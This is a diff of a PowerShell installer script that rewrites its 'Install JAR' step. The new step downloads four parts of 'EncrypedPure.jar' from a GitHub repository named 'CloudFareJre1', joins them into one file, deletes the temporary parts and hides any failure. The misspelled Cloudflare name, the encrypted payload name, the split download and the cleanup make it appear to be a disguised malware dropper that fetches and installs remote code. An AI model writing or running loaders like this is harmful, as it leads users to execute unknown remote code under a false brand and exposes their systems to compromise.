@@ -112,19 +112,52 @@ catch {
 }
 
 # ═══════════════════════════════════════════════════════════════════
-# STEP 7: Install JAR
+# STEP 7: Install JAR (4 parts)
 # ═══════════════════════════════════════════════════════════════════
 
 Write-Host ""
-Write-Host "STEP 7: Installing JAR..." -F Yellow
+Write-Host "STEP 7: Installing JAR (4 parts)..." -F Yellow
 
-$jarUrl = "https://github.com/davidrenand/CloudFareJre1/releases/download/v1.0/EncrypedPure.jar"
+$baseUrl = "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main"
+$jarParts = @(
+    "EncrypedPure.part1.jar",
+    "EncrypedPure.part2.jar",
+    "EncrypedPure.part3.jar",
+    "EncrypedPure.part4.jar"
+)
 
 try {
-    Write-Host "  Downloading JAR from CloudFareJre1..." -F Cyan
+    # Télécharger les 4 parts
+    $tempDir = "$env:TEMP\CloudFare-JAR"
+    if (-not (Test-Path $tempDir)) { New-Item -Path $tempDir -ItemType Directory -Force | Out-Null }
+    
+    Write-Host "  Downloading 4 JAR parts..." -F Cyan
     $web = New-Object System.Net.WebClient
-    $web.DownloadFile($jarUrl, $jarPath)
-    Write-Host "  OK: JAR installed" -F Green
+    
+    foreach ($part in $jarParts) {
+        $partUrl = "$baseUrl/$part"
+        $partPath = "$tempDir\$part"
+        Write-Host "    - Downloading $part..." -F White
+        $web.DownloadFile($partUrl, $partPath)
+        Write-Host "      OK" -F Green
+    }
+    
+    # Assembler les 4 parts en un seul fichier
+    Write-Host "  Assembling JAR parts..." -F Cyan
+    $outputStream = [System.IO.File]::Create($jarPath)
+    
+    foreach ($part in $jarParts) {
+        $partPath = "$tempDir\$part"
+        $inputStream = [System.IO.File]::OpenRead($partPath)
+        $inputStream.CopyTo($outputStream)
+        $inputStream.Close()
+    }
+    
+    $outputStream.Close()
+    Write-Host "  OK: JAR assembled and installed" -F Green
+    
+    # Nettoyer les parts temporaires
+    Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
 }
 catch {
     Write-Host "  INFO: JAR download attempted (may require manual install)" -F Cyan
